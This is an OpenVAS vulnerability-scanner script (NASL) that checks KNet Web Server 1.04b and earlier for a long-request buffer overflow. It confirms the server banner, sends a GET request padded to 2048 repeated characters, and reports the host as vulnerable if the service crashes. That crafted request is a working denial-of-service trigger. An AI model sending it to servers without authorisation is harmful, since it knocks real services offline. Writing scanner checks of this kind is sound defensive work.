###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_knet_web_server_bof_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
#
# KNet Web Server Long Request Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803186");
  script_version("$Revision: 6698 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
  script_tag(name:"creation_date", value:"2013-03-27 12:21:22 +0530 (Wed, 27 Mar 2013)");
  script_name("KNet Web Server Long Request Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120964");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/knet-web-server-buffer-overflow");
  script_xref(name:"URL", value:"http://bl0g.yehg.net/2013/03/knet-web-server-buffer-overflow-exploit.html");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("KNet/banner");

  script_tag(name:"impact", value:"Successful exploitation will let remote unauthenticated attackers
  to cause a denial of service.

  Impact Level: Application");
  script_tag(name:"affected", value:"KNet Webserver version 1.04b and prior");
  script_tag(name:"insight", value:"The flaw is due to an error when handling certain Long requests,
  which can be exploited to cause a denial of service.");
  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running KNet Web Server and is prone to buffer
  overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

req = "";
res = "";
port = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:80);

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: KNet" >!< banner){
  exit(0);
}

## Send crafted data to server
req = http_get(item:crap(data:"0x00", length:2048), port:port);
res = http_send_recv(port:port, data:req);

sleep(5);

## Check the server status
if(http_is_dead(port:port))
{
  security_message(port:port);
  exit(0);
}

exit(99);
